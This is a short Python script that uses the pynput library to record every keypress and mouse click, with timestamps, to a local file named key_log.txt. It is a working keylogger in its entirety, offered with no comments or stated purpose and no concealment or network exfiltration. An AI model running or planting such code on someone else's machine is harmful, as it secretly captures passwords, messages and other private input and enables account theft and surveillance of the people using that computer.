from pynput.keyboard import Key, Listener
from pynput import mouse
import logging

log_dir = ''

logging.basicConfig(filename=(log_dir+'key_log.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def on_click(x, y, button, pressed):
    logging.info(str(button))

with Listener(on_press=on_press) as keylistener, mouse.Listener(on_click=on_click) as mouselistener:
    keylistener.join()
    mouselistener.join()


